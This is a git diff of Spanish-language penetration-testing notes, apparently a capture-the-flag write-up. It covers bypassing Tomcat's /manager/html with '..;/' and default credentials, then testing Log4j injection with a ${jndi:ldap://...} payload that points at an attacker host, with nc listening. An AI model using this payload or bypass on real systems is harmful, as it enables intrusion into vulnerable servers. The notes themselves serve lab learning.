@@ -40,7 +40,7 @@ http://10.10.11.138/pepe/..;/manager/html  → password por Default             
 # Log4j Injection - Tomcat ..;/manager/
 
 ```bash
-en el campo /  → procedemos a hacer la comprobacion ${jndi:ldap://10.10.16.7/LoqueSeaaa} y procedemos a ponernos a la escucha con nc
+en el campo Applicattion /  → procedemos a hacer la comprobacion ${jndi:ldap://10.10.16.7/LoqueSeaaa} y procedemos a ponernos a la escucha con nc
 ```
 Primer Payload De Comprobacion
 
